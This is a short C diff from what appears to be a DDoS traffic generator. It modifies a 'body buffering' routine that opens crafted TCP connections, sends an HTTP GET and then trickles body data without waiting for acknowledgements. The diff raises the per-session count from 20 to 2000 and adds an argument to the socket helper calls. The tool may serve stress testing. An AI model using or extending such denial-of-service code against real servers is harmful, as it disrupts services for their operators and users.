@@ -6,7 +6,7 @@
 #include "ddos/body_buffering.h" 
 
 #define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
-#define BODY_BUFFERING_CNT 20
+#define BODY_BUFFERING_CNT 2000
 
 //session counting
 unsigned long g_bodybuf_num_total;
@@ -56,12 +56,12 @@ void* generate_body_buffering(void *data) {
 
 			sock = tcp_make_connection(inet_addr(g_bodybuf_now_src_ip),
 					inet_addr(g_bodybuf_now_dest_ip), &src_port,
-					g_bodybuf_now_dest_port, &seq, &ack);
+					g_bodybuf_now_dest_port, &seq, &ack,0);
 
 			tcp_socket_send_data(sock, inet_addr(g_bodybuf_now_src_ip),
 					inet_addr(g_bodybuf_now_dest_ip), src_port,
 					g_bodybuf_now_dest_port, GET_METHOD, strlen(GET_METHOD),
-					seq, ack);
+					seq, ack,0);
 			seq += strlen(GET_METHOD);
 
 			body_buffering_cnt = 0;
@@ -78,7 +78,7 @@ void* generate_body_buffering(void *data) {
 
 		tcp_socket_send_data_no_ack(sock, inet_addr(g_bodybuf_now_src_ip),
 				inet_addr(g_bodybuf_now_dest_ip), src_port,
-				g_bodybuf_now_dest_port, data, strlen(data), seq, ack);
+				g_bodybuf_now_dest_port, data, strlen(data), seq, ack,0);
 		seq += strlen(data);
 
 		g_bodybuf_num_generated_in_sec++;
